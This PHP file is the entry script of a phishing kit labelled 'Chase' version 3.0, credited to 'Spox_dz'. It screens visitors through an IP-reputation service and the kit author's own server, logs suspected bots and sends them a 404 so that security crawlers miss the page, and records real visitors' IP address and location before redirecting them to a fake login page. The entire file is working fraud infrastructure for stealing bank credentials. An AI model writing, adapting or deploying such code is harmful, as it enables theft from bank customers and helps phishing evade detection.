<?php
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'admin/YOUR-CONFIG.php';
include'Spox/Anti/blackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


$CHASE_SESSION_SPOX = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));



if ($spox_protection=="yes") {

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://api.iptrooper.net/check/".$_SESSION['ip']."?full=1");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://spox-coder.info/spox/check_ip.php?ip=".$lp."");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		curl_close($ch);

				$check = trim(strip_tags(get_string_between($json,'"bad":',',"')));
				$type = trim(strip_tags(get_string_between($json,'"type":"','"')));

			$key = substr(sha1(mt_rand()),1,25);
			
			if ($anti_bot=="yes") { if ($check == "true") {	
			$content = "#>".$_SESSION['ip']." [ ".$type." ] - [ ".$_SESSION['country']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

			}
			} 

			$content = "#>".$_SESSION['ip']." [ ".$_SESSION['country']." ] - [ ".$_SESSION['city']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$_SESSION['CHASE_SPOX'] = $CHASE_SESSION_SPOX;
			exit(header("Location: login?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
		
				

	}else{
			$content = "#>".$_SESSION['ip']." [ ".$_SESSION['country']." ] - [ ".$_SESSION['city']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$_SESSION['CHASE_SPOX'] = $CHASE_SESSION_SPOX;
			exit(header("Location: login?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

?>